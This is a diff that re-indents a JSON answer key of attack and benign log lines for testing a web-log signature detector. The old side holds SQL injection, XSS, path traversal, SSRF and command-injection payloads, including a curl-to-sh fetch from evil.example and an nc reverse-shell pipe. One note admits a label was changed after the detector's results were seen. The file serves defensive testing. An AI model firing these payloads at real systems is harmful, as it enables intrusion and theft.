@@ -1,471 +1,535 @@
 {
- "schema_version": "1",
- "mode": "defense_signatures",
- "note": "DEFENSEシグネチャ検知(ATTACK_PATTERNS)の正解。ラベルは行の意味(攻撃か否か)で付け、検知器の出力に合わせていない。vulnerable=その種別の攻撃/兆候を含む行。照合キーは (rule_id=パターン名, location=行ID)。",
- "cases": [
-  {
-   "case_id": "sqli-union:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "sqli-union",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /item?id=1 UNION SELECT user,pass FROM users-- HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "素のUNION SELECT"
-  },
-  {
-   "case_id": "sqli-union-urlencoded:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "sqli-union-urlencoded",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /item?id=1%20UNION%20SELECT%201,2 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "URLエンコードされたUNION SELECT(攻撃)"
-  },
-  {
-   "case_id": "sqli-or-urlencoded:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "sqli-or-urlencoded",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /login?u=admin%27%20OR%201%3D1-- HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "URLエンコードされた' OR 1=1(攻撃)"
-  },
-  {
-   "case_id": "sqli-benign-hyphen-slug:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "sqli-benign-hyphen-slug",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/union-select-committee-report HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "記事slugにunionとselectを含むだけ"
-  },
-  {
-   "case_id": "sqli-benign-trailing-dashes:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "sqli-benign-trailing-dashes",
-   "expected": "not_vulnerable",
-   "line": "app[412]: nightly-report job finished --",
-   "note": "アプリログが'--'で終わるだけ"
-  },
-  {
-   "case_id": "xss-script:XSS",
-   "rule_id": "XSS",
-   "location": "xss-script",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=<script>alert(1)</script> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "素のscriptタグ"
-  },
-  {
-   "case_id": "xss-svg-urlencoded:XSS",
-   "rule_id": "XSS",
-   "location": "xss-svg-urlencoded",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=%3Csvg%20onload%3Dprompt(1)%3E HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "エンコードされたsvg onload(攻撃)"
-  },
-  {
-   "case_id": "xss-benign-static:XSS",
-   "rule_id": "XSS",
-   "location": "xss-benign-static",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /static/js/alert-dialog.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "静的ファイル名にalertを含むだけ"
-  },
-  {
-   "case_id": "xss-benign-docs:XSS",
-   "rule_id": "XSS",
-   "location": "xss-benign-docs",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /docs/onerror-handling HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "文書名にonerrorを含むだけ"
-  },
-  {
-   "case_id": "lfi-dotdot:LFI_RFI",
-   "rule_id": "LFI_RFI",
-   "location": "lfi-dotdot",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=../../etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "素の../"
-  },
-  {
-   "case_id": "lfi-dotdot:PATH_TRAVERSAL",
-   "rule_id": "PATH_TRAVERSAL",
-   "location": "lfi-dotdot",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=../../etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "素の../"
-  },
-  {
-   "case_id": "lfi-double-encoded:PATH_TRAVERSAL",
-   "rule_id": "PATH_TRAVERSAL",
-   "location": "lfi-double-encoded",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=%252e%252e%252fetc%252fpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "二重エンコードのトラバーサル(攻撃)"
-  },
-  {
-   "case_id": "lfi-benign-archive:LFI_RFI",
-   "rule_id": "LFI_RFI",
-   "location": "lfi-benign-archive",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /files/archive.2026.tar.gz HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のファイル取得"
-  },
-  {
-   "case_id": "lfi-benign-archive:PATH_TRAVERSAL",
-   "rule_id": "PATH_TRAVERSAL",
-   "location": "lfi-benign-archive",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /files/archive.2026.tar.gz HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のファイル取得"
-  },
-  {
-   "case_id": "cmd-semicolon-cat:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "cmd-semicolon-cat",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /ping?host=1.1.1.1;cat%20/etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": ";cat"
-  },
-  {
-   "case_id": "cmd-backtick:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "cmd-backtick",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?a=`id` HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "バッククォート実行"
-  },
-  {
-   "case_id": "cmd-benign-semicolon-words:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "cmd-benign-semicolon-words",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /tags?list=cats;dogs HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "セミコロン区切りの通常値"
-  },
-  {
-   "case_id": "cmd-benign-lsb:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "cmd-benign-lsb",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /tags?list=red;lsb-release HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "';ls'で始まる別単語"
-  },
-  {
-   "case_id": "cmd-benign-price-label:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "cmd-benign-price-label",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /pricing?currency=USD&label=$(monthly) HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "表示ラベルの$(...)"
-  },
-  {
-   "case_id": "bf-failed-login-lower:BRUTE_FORCE",
-   "rule_id": "BRUTE_FORCE",
-   "location": "bf-failed-login-lower",
-   "expected": "vulnerable",
-   "line": "auth: failed login for admin from 203.0.113.9",
-   "note": "ログイン失敗イベント(小文字)"
-  },
-  {
-   "case_id": "bf-failed-login-capital:BRUTE_FORCE",
-   "rule_id": "BRUTE_FORCE",
-   "location": "bf-failed-login-capital",
-   "expected": "vulnerable",
-   "line": "auth: Failed login for admin from 203.0.113.9",
-   "note": "同じイベントの大文字表記"
-  },
-  {
-   "case_id": "bf-benign-success:BRUTE_FORCE",
-   "rule_id": "BRUTE_FORCE",
-   "location": "bf-benign-success",
-   "expected": "not_vulnerable",
-   "line": "auth: login succeeded for admin from 203.0.113.9",
-   "note": "ログイン成功"
-  },
-  {
-   "case_id": "scanner-sqlmap-ua:SCANNER",
-   "rule_id": "SCANNER",
-   "location": "scanner-sqlmap-ua",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /item?id=1 HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.7.8#stable\"",
-   "note": "スキャナのUA"
-  },
-  {
-   "case_id": "scanner-benign-zapier:SCANNER",
-   "rule_id": "SCANNER",
-   "location": "scanner-benign-zapier",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/zapier-integration-guide HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "記事slugにzapを含むだけ"
-  },
-  {
-   "case_id": "scanner-benign-nmap-doc:SCANNER",
-   "rule_id": "SCANNER",
-   "location": "scanner-benign-nmap-doc",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /downloads/nmap-cheatsheet.pdf HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "資料ダウンロード(スキャン自体ではない)"
-  },
-  {
-   "case_id": "sensitive-env:SENSITIVE_FILE_PROBE",
-   "rule_id": "SENSITIVE_FILE_PROBE",
-   "location": "sensitive-env",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /.env HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": ".envの探索"
-  },
-  {
-   "case_id": "sensitive-git-config:SENSITIVE_FILE_PROBE",
-   "rule_id": "SENSITIVE_FILE_PROBE",
-   "location": "sensitive-git-config",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /.git/config HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": ".git/configの探索"
-  },
-  {
-   "case_id": "sensitive-benign-envelope:SENSITIVE_FILE_PROBE",
-   "rule_id": "SENSITIVE_FILE_PROBE",
-   "location": "sensitive-benign-envelope",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /assets/js/jquery.envelope.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": ".envで始まる別単語"
-  },
-  {
-   "case_id": "cms-wp-login:CMS_PROBE",
-   "rule_id": "CMS_PROBE",
-   "location": "cms-wp-login",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /wp-login.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "WordPressログインの探索"
-  },
-  {
-   "case_id": "cms-benign-article:CMS_PROBE",
-   "rule_id": "CMS_PROBE",
-   "location": "cms-benign-article",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/how-to-secure-wp-admin-panel HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "wp-adminの記事"
-  },
-  {
-   "case_id": "ssrf-metadata:SSRF",
-   "rule_id": "SSRF",
-   "location": "ssrf-metadata",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "メタデータサービス"
-  },
-  {
-   "case_id": "ssrf-urlencoded:SSRF",
-   "rule_id": "SSRF",
-   "location": "ssrf-urlencoded",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http%3A%2F%2F169.254.169.254%2Flatest HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "エンコードされたメタデータ宛(攻撃)"
-  },
-  {
-   "case_id": "ssrf-benign-hostname-param:SSRF",
-   "rule_id": "SSRF",
-   "location": "ssrf-benign-hostname-param",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /health?target=localhost HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "スキームなしのhost名"
-  },
-  {
-   "case_id": "general-benign-page:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:XSS",
-   "rule_id": "XSS",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:LFI_RFI",
-   "rule_id": "LFI_RFI",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:BRUTE_FORCE",
-   "rule_id": "BRUTE_FORCE",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:SCANNER",
-   "rule_id": "SCANNER",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:PATH_TRAVERSAL",
-   "rule_id": "PATH_TRAVERSAL",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:SENSITIVE_FILE_PROBE",
-   "rule_id": "SENSITIVE_FILE_PROBE",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:CMS_PROBE",
-   "rule_id": "CMS_PROBE",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "general-benign-page:SSRF",
-   "rule_id": "SSRF",
-   "location": "general-benign-page",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "通常のページ取得は何にも該当しない"
-  },
-  {
-   "case_id": "lfi-double-encoded:LFI_RFI",
-   "rule_id": "LFI_RFI",
-   "location": "lfi-double-encoded",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=%252e%252e%252fetc%252fpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "二重エンコードの../はLFI_RFIにも該当する(素の../の行と同じ扱いに揃えるラベル修正。検出器の結果を見た後に行った)"
-  },
-  {
-   "case_id": "heldout-sqli-union-all:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "heldout-sqli-union-all",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?id=1+UNION+ALL+SELECT+NULL,NULL HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: UNION ALL SELECT(攻撃)"
-  },
-  {
-   "case_id": "heldout-sqli-benign-union-word:SQL_INJECTION",
-   "rule_id": "SQL_INJECTION",
-   "location": "heldout-sqli-benign-union-word",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /careers?team=union&role=select-staff HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: 通常のクエリ"
-  },
-  {
-   "case_id": "heldout-xss-img-onerror:XSS",
-   "rule_id": "XSS",
-   "location": "heldout-xss-img-onerror",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=<img src=x onerror=alert(1)> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: imgのonerror"
-  },
-  {
-   "case_id": "heldout-xss-benign-js-path:XSS",
-   "rule_id": "XSS",
-   "location": "heldout-xss-benign-js-path",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /static/javascript/main.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: パスにjavascriptを含むだけ"
-  },
-  {
-   "case_id": "heldout-cmd-subshell-curl:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "heldout-cmd-subshell-curl",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?c=$(curl http://evil.example/x|sh) HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: $(curl ...)"
-  },
-  {
-   "case_id": "heldout-cmd-pipe-nc:CMD_INJECTION",
-   "rule_id": "CMD_INJECTION",
-   "location": "heldout-cmd-pipe-nc",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?host=1.1.1.1|nc 203.0.113.9 4444 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: パイプでnc(リバースシェル風)"
-  },
-  {
-   "case_id": "heldout-bf-sshd-failed-password:BRUTE_FORCE",
-   "rule_id": "BRUTE_FORCE",
-   "location": "heldout-bf-sshd-failed-password",
-   "expected": "vulnerable",
-   "line": "sshd[771]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2",
-   "note": "調整後に追加: 実際のsshdのログイン失敗"
-  },
-  {
-   "case_id": "heldout-ssrf-ipv6-loopback:SSRF",
-   "rule_id": "SSRF",
-   "location": "heldout-ssrf-ipv6-loopback",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://[::1]:8080/admin HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: IPv6ループバック宛"
-  },
-  {
-   "case_id": "heldout-ssrf-benign-https-public:SSRF",
-   "rule_id": "SSRF",
-   "location": "heldout-ssrf-benign-https-public",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=https://example.com/feed.xml HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: 公開サイト"
-  },
-  {
-   "case_id": "heldout-scanner-nikto-ua:SCANNER",
-   "rule_id": "SCANNER",
-   "location": "heldout-scanner-nikto-ua",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET / HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
-   "note": "調整後に追加: NiktoのUA"
-  },
-  {
-   "case_id": "heldout-scanner-benign-curl:SCANNER",
-   "rule_id": "SCANNER",
-   "location": "heldout-scanner-benign-curl",
-   "expected": "not_vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /healthz HTTP/1.1\" 200 512 \"-\" \"curl/8.5.0\"",
-   "note": "調整後に追加: curlによる通常のヘルスチェック"
-  },
-  {
-   "case_id": "heldout-sensitive-htpasswd:SENSITIVE_FILE_PROBE",
-   "rule_id": "SENSITIVE_FILE_PROBE",
-   "location": "heldout-sensitive-htpasswd",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /admin/.htpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: .htpasswd探索"
-  },
-  {
-   "case_id": "heldout-lfi-php-filter:LFI_RFI",
-   "rule_id": "LFI_RFI",
-   "location": "heldout-lfi-php-filter",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: php://filter"
-  },
-  {
-   "case_id": "heldout-cms-xmlrpc:CMS_PROBE",
-   "rule_id": "CMS_PROBE",
-   "location": "heldout-cms-xmlrpc",
-   "expected": "vulnerable",
-   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"POST /xmlrpc.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
-   "note": "調整後に追加: xmlrpc.php"
-  }
- ]
+  "schema_version": "1",
+  "mode": "defense_signatures",
+  "note": "DEFENSEシグネチャ検知(ATTACK_PATTERNS)の正解。ラベルは行の意味(攻撃か否か)で付け、検知器の出力に合わせていない。vulnerable=その種別の攻撃/兆候を含む行。照合キーは (rule_id=パターン名, location=行ID)。",
+  "cases": [
+    {
+      "case_id": "sqli-union:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "sqli-union",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /item?id=1 UNION SELECT user,pass FROM users-- HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "素のUNION SELECT"
+    },
+    {
+      "case_id": "sqli-union-urlencoded:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "sqli-union-urlencoded",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /item?id=1%20UNION%20SELECT%201,2 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "URLエンコードされたUNION SELECT(攻撃)"
+    },
+    {
+      "case_id": "sqli-or-urlencoded:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "sqli-or-urlencoded",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /login?u=admin%27%20OR%201%3D1-- HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "URLエンコードされた' OR 1=1(攻撃)"
+    },
+    {
+      "case_id": "sqli-benign-hyphen-slug:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "sqli-benign-hyphen-slug",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/union-select-committee-report HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "記事slugにunionとselectを含むだけ"
+    },
+    {
+      "case_id": "sqli-benign-trailing-dashes:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "sqli-benign-trailing-dashes",
+      "expected": "not_vulnerable",
+      "line": "app[412]: nightly-report job finished --",
+      "note": "アプリログが'--'で終わるだけ"
+    },
+    {
+      "case_id": "xss-script:XSS",
+      "rule_id": "XSS",
+      "location": "xss-script",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=<script>alert(1)</script> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "素のscriptタグ"
+    },
+    {
+      "case_id": "xss-svg-urlencoded:XSS",
+      "rule_id": "XSS",
+      "location": "xss-svg-urlencoded",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=%3Csvg%20onload%3Dprompt(1)%3E HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "エンコードされたsvg onload(攻撃)"
+    },
+    {
+      "case_id": "xss-benign-static:XSS",
+      "rule_id": "XSS",
+      "location": "xss-benign-static",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /static/js/alert-dialog.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "静的ファイル名にalertを含むだけ"
+    },
+    {
+      "case_id": "xss-benign-docs:XSS",
+      "rule_id": "XSS",
+      "location": "xss-benign-docs",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /docs/onerror-handling HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "文書名にonerrorを含むだけ"
+    },
+    {
+      "case_id": "lfi-dotdot:LFI_RFI",
+      "rule_id": "LFI_RFI",
+      "location": "lfi-dotdot",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=../../etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "素の../"
+    },
+    {
+      "case_id": "lfi-dotdot:PATH_TRAVERSAL",
+      "rule_id": "PATH_TRAVERSAL",
+      "location": "lfi-dotdot",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=../../etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "素の../"
+    },
+    {
+      "case_id": "lfi-double-encoded:PATH_TRAVERSAL",
+      "rule_id": "PATH_TRAVERSAL",
+      "location": "lfi-double-encoded",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=%252e%252e%252fetc%252fpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "二重エンコードのトラバーサル(攻撃)"
+    },
+    {
+      "case_id": "lfi-benign-archive:LFI_RFI",
+      "rule_id": "LFI_RFI",
+      "location": "lfi-benign-archive",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /files/archive.2026.tar.gz HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のファイル取得"
+    },
+    {
+      "case_id": "lfi-benign-archive:PATH_TRAVERSAL",
+      "rule_id": "PATH_TRAVERSAL",
+      "location": "lfi-benign-archive",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /files/archive.2026.tar.gz HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のファイル取得"
+    },
+    {
+      "case_id": "cmd-semicolon-cat:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "cmd-semicolon-cat",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /ping?host=1.1.1.1;cat%20/etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": ";cat"
+    },
+    {
+      "case_id": "cmd-backtick:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "cmd-backtick",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?a=`id` HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "バッククォート実行"
+    },
+    {
+      "case_id": "cmd-benign-semicolon-words:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "cmd-benign-semicolon-words",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /tags?list=cats;dogs HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "セミコロン区切りの通常値"
+    },
+    {
+      "case_id": "cmd-benign-lsb:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "cmd-benign-lsb",
